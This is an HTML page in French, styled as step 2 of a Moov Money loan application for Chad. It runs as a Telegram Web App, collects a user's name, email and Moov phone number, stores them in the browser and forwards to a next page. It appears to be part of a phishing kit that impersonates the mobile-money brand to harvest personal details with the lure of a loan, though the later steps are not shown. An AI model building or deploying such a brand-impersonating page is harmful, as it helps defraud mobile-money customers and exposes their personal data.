<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Moov Money - Coordonnées</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #ff6600;
            --moov-blue: #0044cc;
            --bg-color: #f0f4f8;
            --card-bg: #ffffff;
            --input-border: #cbd5e1;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .app-header { width: 100%; background-color: var(--moov-blue); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; border-bottom: 3px solid var(--moov-orange); }
        .back-btn-top { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; color: #fff; }
        .header-title .orange { color: var(--moov-orange); margin-right: 4px; }

        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,68,204,0.08); display: flex; flex-direction: column; }
        .main-title { font-size: 26px; margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: #666; text-align: center; margin-bottom: 20px; }

        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--moov-orange); }

        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        .form-group label { font-size: 15px; font-weight: 700; color: #222; margin-bottom: 10px; }
        .form-control { font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border); border-radius: 10px; outline: none; width: 100%; background: #fff; }
        .form-control:focus { border-color: var(--moov-blue); }

        .phone-group { display: flex; gap: 10px; }
        .country-prefix { display: flex; align-items: center; gap: 6px; background-color: #f1f5f9; border: 1px solid var(--input-border); border-radius: 10px; padding: 0 14px; font-weight: 700; font-size: 15px; }

        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
        .btn-prev { background-color: #e2e8f0; color: #333; border: none; padding: 16px; border-radius: 10px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        .btn-next { background-color: var(--moov-orange); color: white; border: none; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #555; margin-top: auto; }
    </style>
</head>
<body>

<div class="app-header">
    <a onclick="window.location.href='/page2'" class="back-btn-top">← Retour</a>
    <div class="header-title"><span class="orange">Moov</span><span>Money</span></div>
    <div style="width:40px"></div>
</div>

<div class="card">
    <h1 class="main-title">Demande de Prêt</h1>
    <div class="subtext">Étape 2 sur 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <form onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">Prénom</label>
            <input type="text" id="firstName" class="form-control" placeholder="Abakar" required>
        </div>

        <div class="form-group">
            <label for="lastName">Nom</label>
            <input type="text" id="lastName" class="form-control" placeholder="Mahamat" required>
        </div>

        <div class="form-group">
            <label for="email">Adresse Email</label>
            <input type="email" id="email" class="form-control" placeholder="abakar@exemple.td" required>
        </div>

        <div class="form-group">
            <label for="phone">Numéro de Téléphone Moov Money</label>
            <div class="phone-group">
                <div class="country-prefix">
                    <span>🇹🇩</span>
                    <span>+235</span>
                </div>
                <!-- Chad Moov numbers typically start with 6, 9, or 7 -->
                <input type="tel" id="phone" class="form-control" placeholder="99123456" maxlength="8" pattern="[697][0-9]{7}" required>
            </div>
            <div style="font-size: 11px; color: #666; margin-top: 6px;">8 chiffres (ex: 99XXXXXX ou 66XXXXXX)</div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="window.location.href='/page2'">PRÉCÉDENT</button>
            <button type="submit" class="btn-next">ÉTAPE SUIVANTE</button>
        </div>
    </form>
</div>

<div class="footer-banner">© 2026 Moov Africa Tchad</div>

<script>
    window.onload = () => { if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); } };

    function goNext(event) {
        event.preventDefault();
        const phone = document.getElementById('phone').value.trim();

        if (!/^[679]\d{7}$/.test(phone)) {
            alert("Veuillez entrer un numéro Moov Tchad valide à 8 chiffres (commençant par 6, 7 ou 9).");
            return;
        }

        localStorage.setItem('firstName', document.getElementById('firstName').value.trim());
        localStorage.setItem('lastName', document.getElementById('lastName').value.trim());
        localStorage.setItem('email', document.getElementById('email').value.trim());
        localStorage.setItem('phone', phone);
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }
</script>
</body>
</html>
